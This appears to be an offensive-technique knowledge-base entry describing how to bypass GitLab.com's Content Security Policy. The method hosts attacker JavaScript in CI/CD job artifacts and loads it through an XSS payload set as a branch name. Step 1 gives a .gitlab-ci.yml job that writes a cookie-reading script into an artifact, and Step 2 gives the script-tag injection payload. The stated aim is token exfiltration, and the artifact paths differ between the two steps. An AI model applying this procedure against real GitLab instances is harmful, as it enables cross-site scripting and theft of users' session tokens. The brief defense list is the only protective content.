---
id: proc-gitlab-csp-bypass-artifacts-001
tags:
  - csp-bypass
  - job-artifacts
  - gitlab
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.925Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass-CSP-Using-GitLab-Job-Artifacts

## Summary

This procedure circumvents GitLab.com's Content Security Policy by hosting malicious JavaScript in CI/CD job artifacts, which are served from the same origin, allowing external script inclusion in the XSS payload.

## Description

GitLab's CSP blocks arbitrary external scripts, but job artifacts are downloadable via public URLs under the GitLab domain, evading same-origin restrictions. The attacker uploads a .js file via a pipeline job and references it in the branch name payload, enabling advanced attacks like full token exfiltration despite protections.

## Requirements

1. Access to a GitLab repository with CI/CD enabled.
2. Permissions to create jobs and artifacts.
3. Malicious JS payload ready for upload.

## Defense

Defensive measures and detection strategies:

- Tighten CSP to disallow artifact script loading or eval.
- Scan job artifacts for malicious content using antivirus or static analysis.
- Limit public artifact access and monitor unusual downloads.

## Objectives

1. Host JS payload internally to bypass CSP.
2. Enhance XSS with external-like functionality.
3. Maximize impact on protected instances like GitLab.com.

## Instructions

### Step 1: Create Repository and CI Job for Artifact

**Context**: Set up a pipeline to generate and upload the malicious script as an artifact.

No command required; use the UI:

Create a new repo, add a .gitlab-ci.yml with a job like `upload_script: script: echo 'alert(document.cookie);' > token.js artifacts: paths: [token.js]`, and run the pipeline.

> Job completes; artifact available at https://gitlab.com/api/v4/projects/:ID/jobs/:job_id/artifacts/:ref/download?job=upload_script&artifact_path=token.js.

### Step 2: Update XSS Payload to Include Artifact Script

**Context**: Modify the branch name injection to load the artifact-hosted JS.

No command required; use the UI:

In group settings, set default branch to `<script src="https://gitlab.com/api/v4/projects/:ID/jobs/artifacts/:ref/download?job=upload_script&artifact_path=data/token.js"></script>` and save.

> On project load, script src loads from same domain, executes without CSP violation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csp-bypass]]
- [[job-artifacts]]
